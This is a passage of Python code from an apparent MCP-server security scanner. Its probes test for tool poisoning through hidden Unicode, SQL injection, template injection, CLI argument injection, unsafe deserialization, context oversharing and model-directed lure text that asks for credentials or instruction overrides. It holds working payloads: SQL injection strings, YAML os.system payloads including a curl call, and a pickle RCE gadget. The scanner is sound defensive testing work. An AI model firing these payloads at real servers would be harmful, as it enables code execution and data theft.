    params = _str_params(tool)
    if params:
        path_p = next((p for p in params if _PATH_PARAM.search(p)), None)
        content_p = next((p for p in params if _CONTENT_PARAM.search(p)), None)
        return (path_p, content_p) if (path_p and content_p) else None
    if _PATH_PARAM.search(tool.name):                 # empty schema + write-ish name -> guess
        return ("path", "content")
    return None


# ---- tool-metadata concealment (tool poisoning via the approval-view fidelity gap) -----
# Invisible codepoints that reach the model's tokenizer but not a human approval view.
# Ref: "Unicode TAG-Block Concealment of Tool-Metadata Payloads in MCP" (arXiv:2607.05744).
_ZERO_WIDTH = {0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF, 0x00AD}


def _scan_conceal(text: str) -> list[tuple[str, str]]:
    """Return (category, evidence) for each concealment technique found in ``text``."""
    if not text:
        return []
    hits = []
    tag = [c for c in text if 0xE0000 <= ord(c) <= 0xE007F]   # TAG block — smuggled ASCII
    if tag:
        decoded = "".join(chr(ord(c) - 0xE0000) for c in tag if ord(c) - 0xE0000 < 0x80)
        hits.append(("tag-block", f"hidden text: {decoded!r}"))
    if any(ord(c) in _ZERO_WIDTH for c in text):
        hits.append(("zero-width", f"{sum(ord(c) in _ZERO_WIDTH for c in text)} invisible char(s)"))
    if any(0x202A <= ord(c) <= 0x202E or 0x2066 <= ord(c) <= 0x2069 for c in text):
        hits.append(("bidi-override", "direction-override char(s)"))
    if "\x1b" in text:   # ANSI escape sequences (CSI / OSC-8) — hide or rewrite what a human sees
        hits.append(("ansi-escape", f"{text.count(chr(27))} escape sequence(s)"))
    # NOTE: variation selectors (U+FE0F etc.) are intentionally NOT flagged — they are emoji
    # presentation selectors (⚠️ ✅), ubiquitous and benign in tool descriptions. Flagging them
    # produced false positives; TAG-block + zero-width + bidi-override are the real signals.
    return hits


async def probe_tool_poisoning(session, tools) -> list[ProbeResult]:
    """Flag servers that conceal payloads in model-facing metadata (invisible to approval).

    Deterministic, agent-free: inspects each tool's name/description/schema (and resources /
    prompts) for concealment Unicode. A hit means the server hides content the human never
    sees but the model ingests verbatim — the approval-view fidelity gap.
    """
    out = []
    surfaces = [(t.name, t.name, json.dumps(_schema(t), ensure_ascii=False)
                 + " " + (t.description or "")) for t in tools]
    try:    # resources & prompts carry model-facing text too; many servers lack them
        for r in (await session.list_resources()).resources:
            surfaces.append(("resource:" + (r.name or str(r.uri)), str(r.uri),
                             (r.name or "") + " " + (r.description or "")))
    except Exception:  # noqa: BLE001
        pass
    try:
        for p in (await session.list_prompts()).prompts:
            surfaces.append(("prompt:" + p.name, p.name,
                             (p.description or "") + " "
                             + " ".join((a.description or "") for a in (p.arguments or []))))
    except Exception:  # noqa: BLE001
        pass
    for label, name, text in surfaces:
        hits = _scan_conceal(name) + _scan_conceal(text)
        if hits:
            out.append(ProbeResult("tool_poisoning", label, "static",
                                   evidence="; ".join(f"{c}: {e}" for c, e in hits),
                                   rationale="concealed payload in model-facing metadata "
                                             "(invisible in the approval view)"))
    return out


# ---- SQL injection (CWE-89) — READ-ONLY payloads, honestly graded (#58) ----------------------------
# Every payload below is read-only. A security probe must never mutate a caller's data: the old
# "1); DROP TABLE x--" payload was removed for exactly that reason (dbhub executed multi-statement DDL live).
def _sql_union_payloads(v: str, a: int, b: int) -> list[str]:
    """UNION-exfil. Success = the per-run PRODUCT a*b in the response. Only real SQL evaluation produces
    the number; a reflected payload carries the expression 'a*b', never the product — so this is PROOF.
    Covers a string context (closes a quote) and a numeric context, 1-3 result columns."""
    e = f"{a}*{b}"
    tails = [f"{e}--", f"NULL,{e}--", f"NULL,NULL,{e}--"]
    return [f"{v}' UNION SELECT {t}" for t in tails] + [f"0 UNION SELECT {t}" for t in tails]


def _sql_boolean_triples(v: str) -> list[tuple[str, str, str]]:
    """3-way boolean differential: (baseline, true-predicate, false-predicate), string + numeric context.
    The string form closes the quote AND comments out the server's trailing text (`'--`), the standard
    form for a LIKE/equality context, so the predicate really is the one we send."""
    return [(v, f"{v}' OR '1'='1'--", f"{v}' AND '1'='2'--"), ("0", "0 OR 1=1", "0 AND 1=2")]


_SQL_ERROR_PROBES = ["'", '"', "')--", "' OR '1'='1"]


async def _sql_try(session, tool, param: str, value: str, returned: list, raised: list) -> str:
    """Send one payload; return the response text (or the raised error text — some servers surface the
    SQL error as a tool error, and that text is still the signal). Records what came back."""
    try:
        txt = _result_text(await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, value)})))
        returned.append(txt)
    except Exception as exc:  # noqa: BLE001
        txt = str(exc)
        raised.append(txt)
    return txt


async def probe_sql_injection(session, tools) -> list[ProbeResult]:
    """SQL injection, graded by HOW it was confirmed (honesty spine):
      UNION-exfil   -> PROOF (the per-run product a*b returned)                          -> VULNERABLE
      boolean 3-way -> INFERENCE (true/false split; a search tool can vary with input)   -> SUSPECTED
      error-based   -> INFERENCE (a SQL parser error surfaced)                            -> SUSPECTED
      time-based    -> EXCLUDED on purpose (wall-clock oracle: jitter/load false positives)
    A dedicated SQL-execution tool is by_design (it runs SQL). Every payload is read-only."""
    out = []
    a = 100000 + uuid.uuid4().int % 900000       # per-run, so the product is unique to this scan
    b = 100000 + uuid.uuid4().int % 900000
    product = str(a * b)
    product_re = re.compile(rf"(?<!\d){product}(?!\d)")
    for tool in tools:
        params = _candidate_params(tool, _SQL_PARAM, _SQL_DESC, ["query", "sql", "term", "filter", "id"])
        if not params:
            continue
        desc = (tool.description or "") + " " + tool.name
        is_executor = bool(_SQL_EXEC.search(desc))
        v = "zz_no_row_" + uuid.uuid4().hex[:6]  # a benign value that matches no row
        returned, raised = [], []
        proof = None
        for param in params:                     # 1) PROOF first
            for p in _sql_union_payloads(v, a, b):
                txt = await _sql_try(session, tool, param, p, returned, raised)
                if product_re.search(txt) and not _is_refusal(txt):
                    proof = (p, txt[:160])
                    break
            if proof:
                break
        if proof:
            if is_executor:
                out.append(ProbeResult("sql_injection", tool.name, "by_design", evidence=proof[0],
                                       rationale="dedicated SQL-execution tool computed a UNION product — "
                                                 "by-design (it runs SQL), not injection"))
            else:
                out.append(ProbeResult("sql_injection", tool.name, "oracle", evidence=proof[0],
                                       rationale=f"UNION-based SQL injection: the server returned the per-run "
                                                 f"product {product}, which only SQL evaluation can produce "
                                                 "(read-only payload)"))
            continue
        lead = None                              # 2) INFERENCE only — never confirmed on its own
        for param in params:
            for base, t_true, t_false in _sql_boolean_triples(v):
                tb = await _sql_try(session, tool, param, base, returned, raised)
                tt = await _sql_try(session, tool, param, t_true, returned, raised)
                tf = await _sql_try(session, tool, param, t_false, returned, raised)
                tt2 = await _sql_try(session, tool, param, t_true, returned, raised)   # determinism check
                tf2 = await _sql_try(session, tool, param, t_false, returned, raised)
                if tt != tf and tf == tb and tt2 == tt and tf2 == tf:
                    lead = ("boolean", f"true '{t_true}' vs false '{t_false}' split, deterministic")
                    break
            if lead:
                break
            for p in _SQL_ERROR_PROBES:
                txt = await _sql_try(session, tool, param, p, returned, raised)
                if _SQL_ERR.search(txt) and not _SQL_FALSE.search(txt):   # exclude FTS5/full-text errors
                    lead = ("error-based", txt[:160])
                    break
            if lead:
                break
        if lead:
            kind, ev = lead
            if is_executor:
                out.append(ProbeResult("sql_injection", tool.name, "by_design", evidence=ev,
                                       rationale="dedicated SQL-execution tool surfaced a SQL-level signal — "
                                                 "by-design (it runs SQL)"))
            else:
                out.append(ProbeResult("sql_injection", tool.name, "signature", evidence=ev,
                                       rationale=f"{kind} SQL inference, not a proof: {ev} — a search/filter "
                                                 "tool can vary with input without being injectable, so this "
                                                 "is a lead to confirm"))
            continue
        out.append(ProbeResult("sql_injection", tool.name, _negative_method(returned, raised),
                               rationale="no UNION product, boolean split or SQL error surfaced"))
    return out


_TEMPLATE_PARAM = re.compile(r"template|input|text|message|name|content|value|format|body|subject|"
                             r"title|greeting|prompt", re.I)
_TEMPLATE_DESC = re.compile(r"template|render|format|greet|message|email|report|interpolat|"
                            r"substitut|compose", re.I)
_SSTI_PAYLOADS = ["{{1337*1337}}", "${1337*1337}", "#{1337*1337}", "<%= 1337*1337 %>"]
_SSTI_MARK = "1787569"   # 1337*1337 — distinctive, won't occur naturally; appears only if evaluated

# Argument injection / CLI-flag smuggling: a tool wraps a CLI and passes a param as an argv
# element. A leading-dash value is then interpreted as a FLAG (no shell metacharacters needed —
# defeats allowlists that only block shell chars). Ground truth: inject a benign flag and detect
# its effect in the response (version/usage banner the normal data path would never contain).
_ARG_DESC = re.compile(r"\bgit\b|\btar\b|\bcurl\b|\bwget\b|rsync|ffmpeg|\bzip\b|archive|clone|"
                       r"backup|fetch|download|convert|\bcli\b|command[- ]?line|wrapper|invoke", re.I)
_ARG_PARAM = re.compile(r"arg|ref|option|flag|url|target|source|dest|file|path|name|input|query", re.I)
# Must match a flag TAKING EFFECT (version/usage banner), never the echoed payload itself.
_FLAG_EFFECT = re.compile(r"usage:|\boptions:|GNU \w|libcurl|curl/?\s?\d|git version|wget\s?\d|"
                          r"OpenSSL/|copyright|\blicense\b", re.I)


async def probe_arg_injection(session, tools) -> list[ProbeResult]:
    out = []
    for tool in tools:
        params = _candidate_params(tool, _ARG_PARAM, _ARG_DESC, ["arg", "url", "target", "option", "input"])
        if not params:
            continue
        fired, used, ev = False, "", ""
        returned, raised = [], []
        for param in params:
            for p in ("--version", "--help", "-V"):
                try:
                    r = await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, p)}))
                    txt = _result_text(r)
                    returned.append(txt)
                except Exception as exc:  # noqa: BLE001
                    txt = str(exc)
                    raised.append(txt)
                if _FLAG_EFFECT.search(txt):
                    fired, used, ev = True, p, txt[:120]
                    break
            if fired:
                break
        out.append(ProbeResult("arg_injection", tool.name,
                               "signature" if fired else _negative_method(returned, raised), evidence=used,
                               rationale=(f"leading-dash value interpreted as a CLI flag by the wrapped "
                                          f"binary — argument injection: {ev}" if fired
                                          else "input not interpreted as a CLI flag")))
    return out


async def probe_ssti(session, tools) -> list[ProbeResult]:
    """Server-side template injection: a template expression that the server EVALUATES
    (1337*1337 -> 1787569 in the output) rather than echoing literally. Distinctive marker,
    near-zero false positive."""
    out = []
    for tool in tools:
        params = _candidate_params(tool, _TEMPLATE_PARAM, _TEMPLATE_DESC,
                                   ["input", "template", "text", "message"])
        if not params:
            continue
        fired, used = False, ""
        returned, raised = [], []
        for param in params:
            for p in _SSTI_PAYLOADS:
                try:
                    r = await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, p)}))
                    txt = _result_text(r)
                    returned.append(txt)
                except Exception as exc:  # noqa: BLE001
                    txt = ""
                    raised.append(str(exc))
                if _SSTI_MARK in txt:
                    fired, used = True, p
                    break
            if fired:
                break
        out.append(ProbeResult("ssti", tool.name,
                               "oracle" if fired else _negative_method(returned, raised), evidence=used,
                               rationale=("template expression evaluated server-side "
                                          "(1337*1337 = 1787569 in output)" if fired
                                          else "template expression not evaluated")))
    return out


async def probe_rug_pull(session, tools) -> list[ProbeResult]:
    """Rug pull / dynamic tool redefinition: tool definitions that MUTATE within a session
    (description/schema changed, tools added/removed) after benign interaction — the
    post-approval-mutation indicator. Honest scope: detects in-session mutation, a rug-pull
    signal, not a multi-day post-approval swap."""
    import hashlib

    def h(t):
        body = (t.description or "") + json.dumps(_schema(t), ensure_ascii=False, sort_keys=True)
        return hashlib.sha1(body.encode()).hexdigest()

    before = {t.name: h(t) for t in tools}
    for t in tools[:3]:                                    # benign interaction to trigger any mutation
        try:
            await session.call_tool(t.name, _build_args(t, {}))
        except Exception:  # noqa: BLE001
            pass
    try:
        after_tools = (await session.list_tools()).tools
    except Exception:  # noqa: BLE001
        return [ProbeResult("rug_pull", "(server)", "error", rationale="could not re-enumerate tools")]
    after = {t.name: h(t) for t in after_tools}
    changed = [n for n in before if n in after and before[n] != after[n]]
    added = [n for n in after if n not in before]
    removed = [n for n in before if n not in after]
    if changed or added or removed:
        return [ProbeResult("rug_pull", (changed or added or removed)[0], "observed_change",
                            evidence=f"changed={changed} added={added} removed={removed}",
                            rationale="tool definitions mutated within a session "
                                      "(dynamic redefinition — rug-pull indicator)")]
    return [ProbeResult("rug_pull", "(server)", "oracle_negative",
                        rationale="tool definitions stable across the session")]


def _mk_pickle_b64(cmd: str) -> str:
    """A base64 pickle whose unpickling runs `cmd` (the classic pickle RCE gadget). We only
    serialize it here; the code executes if-and-only-if the TARGET unpickles it."""
    import base64
    import pickle

    class _Gadget:
        def __reduce__(self):
            return (os.system, (cmd,))
    return base64.b64encode(pickle.dumps(_Gadget())).decode()


async def probe_deserialization(session, tools) -> list[ProbeResult]:
    """Unsafe deserialization → RCE (CWE-502): a tool runs yaml.load / pickle.loads / similar on
    attacker-supplied input. Ground truth: a sentinel file only deserialization-triggered code could
    create (or a hit on our loopback sink). Unlike command execution, no tool legitimately wants
    deserialization RCE, so a fire is always a finding — no by-design carve-out."""
    out = []
    d = Path(tempfile.mkdtemp(prefix="probe_deser_"))
    sink = _Sink().start()
    try:
        for tool in tools:
            params = _candidate_params(tool, _DESER_PARAM, _DESER_DESC,
                                       ["data", "payload", "yaml", "config", "serialized", "obj"])
            if not params:
                continue
            fired, used = False, ""
            returned, raised = [], []
            for param in params:
                sentinel = d / ("s_" + uuid.uuid4().hex[:10])
                dmarker = "deser-" + uuid.uuid4().hex[:10]
                sink_url = f"http://127.0.0.1:{sink.port}/{dmarker}"
                payloads = [
                    f'!!python/object/apply:os.system ["touch {sentinel}"]',               # yaml.load RCE
                    f'!!python/object/apply:subprocess.call [["touch", "{sentinel}"]]',
                    f'!!python/object/apply:os.system ["curl -s {sink_url}"]',              # network-confirmed
                    _mk_pickle_b64(f"touch {sentinel}"),                                    # pickle.loads RCE
                ]
                for p in payloads:
                    try:
                        r = await session.call_tool(tool.name, _build_args(tool, {param: _inject(tool, param, p)}))
                        returned.append(_result_text(r))
                    except Exception as exc:  # noqa: BLE001
                        raised.append(str(exc))
                    await asyncio.sleep(0.05)
                    if sentinel.exists() or sink.hit(dmarker):
                        fired, used = True, p
                        break
                if fired:
                    break
            if fired:
                out.append(ProbeResult("deserialization", tool.name, "oracle", evidence=used[:120],
                           rationale="tool deserialized attacker input and executed code (unsafe "
                                     "yaml.load / pickle.loads / eval) — ground-truthed by a sentinel "
                                     "only RCE could create (CWE-502)"))
            else:
                out.append(ProbeResult("deserialization", tool.name, _negative_method(returned, raised),
                           rationale="no deserialization payload achieved code execution"))
    finally:
        sink.stop()
        shutil.rmtree(d, ignore_errors=True)
    return out


_CTX_CANARY = ""   # set by scan_target: the planted env secret probe_context_oversharing hunts for


def _res_text(result) -> str:
    """Text of a resource read (contents[].text), for scanning what a resource hands the model."""
    out = []
    for c in (getattr(result, "contents", None) or []):
        t = getattr(c, "text", None)
        if t:
            out.append(t)
    return "\n".join(out)


_RES_CACHE: dict | None = None      # per-scan memo, set by scan_target: body-reading probes share one read per URI


async def _read_resource(session, uri):
    """resources/read, shared within one scan: context_oversharing and lure_text read each body once."""
    if _RES_CACHE is None:                                    # outside scan_target: no sharing
        return await asyncio.wait_for(session.read_resource(uri), _CALL_TIMEOUT_S)
    key = (id(session), str(uri))             # keyed by session too: two servers can expose the same URI
    if key not in _RES_CACHE:
        try:
            _RES_CACHE[key] = (await asyncio.wait_for(session.read_resource(uri), _CALL_TIMEOUT_S), None)
        except Exception as exc:  # noqa: BLE001 — cache the failure too, so every reader sees the same outcome
            _RES_CACHE[key] = (None, exc)
    res, err = _RES_CACHE[key]
    if err is not None:
        raise err
    return res


async def probe_context_oversharing(session, tools) -> list[ProbeResult]:
    """Context oversharing (OWASP MCP10, CWE-200): a tool or resource hands the model data from the
    server's environment it was never scoped to see. Ground truth: scan_target plants a unique secret
    in the server's env; if that exact secret comes back in any model-facing output, the server leaks
    its context. Only our planted UUID counts as the finding (zero-FP) — a server that simply echoes a
    user-supplied value is not oversharing."""
    canary = _CTX_CANARY
    if not canary:
        return [ProbeResult("context_oversharing", "(server)", "not_applicable", rationale="no context canary planted")]
    out: list[ProbeResult] = []
    returned, raised = [], []
    for t in tools:                                   # exercise each tool with benign args
        try:
            text = _result_text(await session.call_tool(t.name, _build_args(t, {})))
            returned.append(text)
        except Exception as exc:  # noqa: BLE001
            raised.append(str(exc))
            continue
        if canary in text:
            out.append(ProbeResult("context_oversharing", t.name, "oracle", marker=canary,
                       rationale="tool returned the server's environment context (a planted secret) to "
                                 "the model — context oversharing (OWASP MCP10 / CWE-200)"))
    try:                                              # and every resource the server exposes
        for res in (await session.list_resources()).resources:
            try:
                text = _res_text(await _read_resource(session, res.uri))
                returned.append(text)
            except Exception as exc:  # noqa: BLE001
                raised.append(str(exc))
                continue
            if canary in text:
                out.append(ProbeResult("context_oversharing", "resource:" + str(res.uri), "oracle",
                           marker=canary, rationale="resource exposed the server's environment context "
                                                    "(a planted secret) to the model (OWASP MCP10 / CWE-200)"))
    except Exception:  # noqa: BLE001 — many servers expose no resources endpoint
        pass
    if not out:
        out.append(ProbeResult("context_oversharing", "(server)", _negative_method(returned, raised),
                   rationale="no tool or resource surfaced the planted environment secret"))
    return out


_SCHEMA_DOC_KEYS = ("title", "description", "examples", "default")


def _schema_docs(node, path: str = "") -> list[tuple[str, str]]:
    """(path, text) for every documentation string in a JSON schema: titles, descriptions, examples, defaults."""
    out: list[tuple[str, str]] = []
    if isinstance(node, dict):
        for k, v in node.items():
            p = f"{path}.{k}" if path else k
            if k in _SCHEMA_DOC_KEYS and isinstance(v, str):
                out.append((p, v))
            elif k in _SCHEMA_DOC_KEYS and isinstance(v, list):
                out += [(p, x) for x in v if isinstance(x, str)]
            elif isinstance(v, (dict, list)):
                out += _schema_docs(v, p)
    elif isinstance(node, list):
        for i, v in enumerate(node):
            out += _schema_docs(v, f"{path}[{i}]")
    return out


def _lure_rows(owner: str, surfaces: list[tuple[str, str]]) -> list[ProbeResult]:
    """One SUSPECTED row per lure, with its surface and matched span as evidence. A CLEAN row when none is found,
    so coverage shows the text was read; that CLEAN is only the static scan's own negative."""
    rows = []
    for path, text in surfaces:
        for rule, span in scan_text(text):
            rows.append(ProbeResult("lure_text", owner, "static", marker=rule,
                                    evidence=f'{owner} / {path}: "{span}"', rationale=RULE_WHY[rule]))
    if not rows:
        rows.append(ProbeResult("lure_text", owner, "oracle_negative",
                                rationale="static scan of the model-facing text found no lure (runtime elicitation "
                                          "and sampling text is not visible without a call)"))
    return rows


async def probe_lure_text(session, tools) -> list[ProbeResult]:
    """Model-directed lure text (Detector Unit 1): tool descriptions, parameter text, annotations, resource bodies and prompt text
    that tell the model to forward a credential, override what it was told to do, call a forward safe, or request
    a credential "for confirmation". Static, so every hit is a SUSPECTED lead, never VULNERABLE."""
    out: list[ProbeResult] = []
    for t in tools:
        a = getattr(t, "annotations", None)
        ann = a.model_dump(exclude_none=True) if hasattr(a, "model_dump") else dict(a or {})
        surfaces = [("description", t.description or ""), ("title", getattr(t, "title", None) or "")]
        surfaces += [(f"annotations.{k}", v) for k, v in ann.items() if isinstance(v, str)]
        surfaces += [(f"schema.{p}", v) for p, v in _schema_docs(_schema(t))]
        out += _lure_rows(t.name, surfaces)
    try:
        resources = (await session.list_resources()).resources
    except Exception as exc:  # noqa: BLE001
        resources = []
        if getattr(getattr(exc, "error", None), "code", None) != -32601:    # -32601: no resources endpoint
            out.append(ProbeResult("lure_text", "(resources)", "error",
                                   rationale=f"resources/list failed: {_unwrap(exc)[:120]}"))
    for r in resources:
        owner = f"resource:{r.uri}"
        try:
            res = await _read_resource(session, r.uri)
        except Exception as exc:  # noqa: BLE001
            out.append(ProbeResult("lure_text", owner, "error",
                                   rationale=f"resources/read failed: {_unwrap(exc)[:120]}"))
            continue
        contents = getattr(res, "contents", None) or []
        texts = [c.text for c in contents if getattr(c, "text", None)]
        if contents and not texts:                  # binary only: nothing was decoded, so nothing was scanned
            out.append(ProbeResult("lure_text", owner, "error",
                                   rationale="binary-only resource: body not decoded, lure text not scanned"))
            continue
        out += _lure_rows(owner, [("name", r.name or ""), ("description", r.description or ""),
                                  ("body", "\n".join(texts))])
    try:    # prompts are model-facing text too: a template's messages are what the model is handed
        prompts = (await session.list_prompts()).prompts
    except Exception as exc:  # noqa: BLE001
        prompts = []
        if getattr(getattr(exc, "error", None), "code", None) != -32601:    # -32601: no prompts endpoint
            out.append(ProbeResult("lure_text", "(prompts)", "error",
                                   rationale=f"prompts/list failed: {_unwrap(exc)[:120]}"))
    for p in prompts:
        owner = f"prompt:{p.name}"
        args = list(p.arguments or [])
        meta = [("name", p.name or ""), ("description", p.description or "")]
        meta += [(f"argument.{a.name}", a.description or "") for a in args]
        try:    # rendered with placeholder values, so the text the model would receive is what gets scanned
            res = await asyncio.wait_for(session.get_prompt(p.name, {a.name: "example" for a in args}), _CALL_TIMEOUT_S)
        except Exception as exc:  # noqa: BLE001
            out.append(ProbeResult("lure_text", owner, "error", rationale=f"prompts/get failed: {_unwrap(exc)[:120]}"))
            continue
        texts = [m.content.text for m in (res.messages or []) if getattr(m.content, "text", None)]
        out += _lure_rows(owner, meta + [("messages", "\n".join(texts))])
    if not out:
        out.append(ProbeResult("lure_text", "(server)", "not_applicable",
                               rationale="no tools, resources or prompts exposed"))
    return out


async def probe_session_argument(session, tools) -> list[ProbeResult]:
    """A session-type credential requested as a tool argument (Unit 2). Static and argument-level: one argument's own
    description asks the model for the agent's session-type credential. A well-built server authenticates through its own
    configuration, so a hit is a SUSPECTED lead, never VULNERABLE. The vocabulary and boundary are Unit 1's (hunt/lure_text.py)."""
    out: list[ProbeResult] = []
    for t in tools:
        purpose_sessions = bool(re.search(r"\bsessions?\b", t.description or "", re.I))
        found = False
        for arg, spec in (_schema(t).get("properties") or {}).items():
            spec = spec if isinstance(spec, dict) else {}
            if non_string_type(spec):      # a credential is a string: an integer, number or boolean argument is not one
                continue
            desc, title = spec.get("description"), spec.get("title")
            hits = [("description", r, s) for r, s in scan_argument_text(desc if isinstance(desc, str) else "")]
            hits += [("title", r, s) for r, s in scan_argument_text(title if isinstance(title, str) else "")]
            hits += [("name", r, s) for r, s in scan_argument_name(arg)]
            for surface, rule, span in hits:
                found = True
                weaker = "; weaker: the tool's stated purpose involves sessions" if purpose_sessions else ""
                out.append(ProbeResult("session_argument", t.name, "static", marker=rule,
                                       evidence=f'{t.name} / argument {arg} ({surface}): "{span}"',
                                       rationale="a tool argument asks the model for the agent's session-type credential" + weaker))
        if not found:
            out.append(ProbeResult("session_argument", t.name, "oracle_negative",
                                   rationale="no argument requests the agent's session-type credential"))
    return out


ALL_PROBES = [probe_ssrf, probe_command_injection, probe_path_traversal,
              probe_tool_poisoning, probe_sql_injection, probe_ssti, probe_rug_pull,
              probe_arg_injection, probe_deserialization, probe_context_oversharing,
              probe_lure_text, probe_session_argument]


class ScanError(RuntimeError):
    """A target could not be probed — carries the unwrapped root-cause message (not the opaque
    anyio 'unhandled errors in a TaskGroup' wrapper), so every caller can report/classify honestly."""


def _unwrap(exc: BaseException) -> str:
    """Flatten an exception group to its first informative (non-cancel) leaf: 'Type: message'."""
    subs = getattr(exc, "exceptions", None)
    if subs:                                    # an ExceptionGroup — recurse to a real leaf
        for sub in subs:
            if msg := _unwrap(sub):
                return msg
        return ""
    if isinstance(exc, asyncio.CancelledError):
        return ""                               # cancellation = timeout artifact, not the cause
    return f"{type(exc).__name__}: {exc}".strip().rstrip(":").strip()[:200]


# Timeouts (seconds), env-overridable — no per-tool/per-server special-casing. A single slow or
# hanging tool must never wedge the whole scan, and a stuck connect must not hang forever.
_CALL_TIMEOUT_S = float(os.environ.get("MCPRT_CALL_TIMEOUT_S", "20"))
_CONNECT_TIMEOUT_S = float(os.environ.get("MCPRT_CONNECT_TIMEOUT_S", "30"))


def _guard_call_tool(session, timeout: float) -> None:
    """Bound every tool call on this session by `timeout`. Probes already treat a raised
    exception as 'no result' and move on, so a hung tool is skipped, not fatal. One wrap
    here covers all call sites — no per-tool logic."""
    original = session.call_tool

    async def guarded(*args, **kwargs):
        return await asyncio.wait_for(original(*args, **kwargs), timeout)

    session.call_tool = guarded


async def scan_target(argv: list[str], env: dict | None = None, probes=None,
                      surface: dict | None = None) -> list[ProbeResult]:
    # Spawn the target in a throwaway cwd so any stray write (by the server or a payload) lands
    # there, never in the repo/working dir. Cleaned up afterwards.
    # If `surface` is passed, it's filled with the server's attack-surface inventory (tools +
    # resources) during the SAME session — no second connect.
    workdir = tempfile.mkdtemp(prefix="mcprt_scan_")
    # Plant a unique secret in the server's environment. If any tool/resource surfaces it to the model,
    # the server overshares its context (MCP10) — ground truth, since a random UUID can't be coincidence.
    # ponytail: module global = one-scan-at-a-time; add a context arg if we ever scan concurrently.
    global _CTX_CANARY, _RES_CACHE
    _CTX_CANARY = "mcprt-ctx-" + uuid.uuid4().hex
    _RES_CACHE = {}          # one resources/read per URI per scan, shared by the body-reading probes
    child_env = dict(env or os.environ)
    child_env["MCPRT_CONTEXT_CANARY"] = _CTX_CANARY
    params = StdioServerParameters(command=argv[0], args=argv[1:], env=child_env, cwd=workdir)
    results: list[ProbeResult] = []
    try:
        async with stdio_client(params) as (read, write):
            async with ClientSession(read, write) as s:
                # Bound connect/handshake so an unresponsive server fails fast instead of hanging.
                await asyncio.wait_for(s.initialize(), _CONNECT_TIMEOUT_S)
                _guard_call_tool(s, _CALL_TIMEOUT_S)
                tools = (await asyncio.wait_for(s.list_tools(), _CONNECT_TIMEOUT_S)).tools
                if surface is not None:          # inventory the attack surface in-session (no 2nd connect)
                    surface["tools"] = [{"name": t.name,
                                         "params": sorted(_schema(t).get("properties", {}))}
                                        for t in tools]
                    try:
                        surface["resources"] = [str(getattr(r, "uri", getattr(r, "name", "")))
                                                for r in (await s.list_resources()).resources]
                    except Exception:  # noqa: BLE001 — many servers expose no resources endpoint
                        surface["resources"] = []
                    # Liveness: does a benign tool call work, or does the server reject it for lack of
                    # credentials? If auth-gated, the execution-dependent probes can't really run, and the
                    # caller must report "requires credentials" instead of a false CLEAN.
                    surface["auth_gated"] = False
                    if tools:
                        try:
                            lr = await s.call_tool(tools[0].name, _build_args(tools[0], {}))
                            surface["auth_gated"] = is_auth_error(_result_text(lr))
                        except Exception as le:  # noqa: BLE001
                            surface["auth_gated"] = is_auth_error(str(le))
                for probe in (probes or ALL_PROBES):
                    # Isolate each probe: a timeout or error in one class must not discard the
                    # verdicts already gathered by the others. Partial coverage beats no result.
                    try:
                        results.extend(await probe(s, tools))
                    except Exception as pe:  # noqa: BLE001
                        results.append(ProbeResult(getattr(probe, "__name__", "probe"), "-", "error",
                                                   rationale=f"probe aborted: {_unwrap(pe) or type(pe).__name__}"))
    except Exception as exc:   # unwrap anyio/TaskGroup noise into a readable root cause (timeouts/cancel still propagate)
        raise ScanError(_unwrap(exc) or f"{type(exc).__name__}: {exc}"[:200]) from exc
    finally:
        _RES_CACHE = None
        shutil.rmtree(workdir, ignore_errors=True)
    return results


def _write_log(target: str, results: list[ProbeResult]) -> str:
    """Persist a timestamped JSON evidence log of one hunt run; the DB's scans.evidence stores its path."""
    import datetime
    import json
    from dataclasses import asdict

    logs = Path(__file__).resolve().parent / "logs"
    logs.mkdir(exist_ok=True)
    safe = re.sub(r"[^A-Za-z0-9._-]+", "_", target)[:60].strip("_") or "target"
    stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = logs / f"{stamp}_{safe}.json"
    path.write_text(json.dumps({"target": target, "scanned_at": stamp,
                                "results": [asdict(r) for r in results]}, indent=2))
    return str(path)


def _print(results: list[ProbeResult]) -> None:
    if not results:
        print("  (no candidate tools matched any probe)")
        return
    for r in results:
        tag = {"VULNERABLE": "\033[31mVULN\033[0m", "SUSPECTED": "\033[33mSUSPECT\033[0m",
               "CLEAN": "\033[32mok\033[0m", "INCONCLUSIVE": "\033[90mINCONCL\033[0m",
               "NOT_APPLICABLE": "\033[90mn/a\033[0m"}.get(r.verdict, r.verdict)
        print(f"  [{tag:>12}] {r.probe:<18} {r.tool:<22} {r.rationale}")


def _selftest() -> bool:
    base = Path(__file__).resolve().parent / "probe_fixtures"
    py = sys.executable
    vuln = asyncio.run(scan_target([py, str(base / "vuln_server.py")]))
    safe = asyncio.run(scan_target([py, str(base / "safe_server.py")]))

    def fired(results, probe):   # a probe "fires" if it reaches a POSITIVE signal — proof (VULNERABLE)
        return any(r.verdict in (VULNERABLE, SUSPECTED)   # or inference lead (SUSPECTED), per the spine
                   for r in results if r.probe == probe)

    print("vuln fixture (every probe must FIRE):")
    _print(vuln)
    print("safe fixture (every probe must stay QUIET):")
    _print(safe)

    ok = True
    for probe in ("ssrf", "command_injection", "path_traversal", "tool_poisoning",
                  "sql_injection", "ssti", "rug_pull", "arg_injection", "deserialization"):
        if not fired(vuln, probe):
            print(f"  FAIL: {probe} did not fire on vuln fixture"); ok = False
        if fired(safe, probe):
            print(f"  FAIL: {probe} false-positived on safe fixture"); ok = False

    # negative: an unprobeable target must raise a READABLE ScanError, never the opaque TaskGroup wrapper
    try:
        asyncio.run(scan_target([py, str(base / "no_such_server_xyz.py")]))
        print("  FAIL: scan of missing target did not raise"); ok = False
    except ScanError as e:
        if "TaskGroup" in str(e) or not str(e).strip():
            print(f"  FAIL: ScanError still opaque: {e!s}"); ok = False
        else:
            print(f"  ok: unprobeable target -> ScanError({str(e)[:60]})")
    except Exception as e:  # noqa: BLE001
        print(f"  FAIL: raised {type(e).__name__}, not ScanError: {str(e)[:80]}"); ok = False

    print("probes self-check:", "ok" if ok else "FAILED")
    return ok


def main(argv=None) -> int:
    p = argparse.ArgumentParser(prog="hunt.probes", description="impl-bug probes for MCP servers")
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--selftest", action="store_true", help="prove probes fire/stay quiet on fixtures")
    g.add_argument("--target-stdio", metavar="CMD", help='local server to probe, e.g. "npx some-mcp"')
    args = p.parse_args(argv)
    if args.selftest:
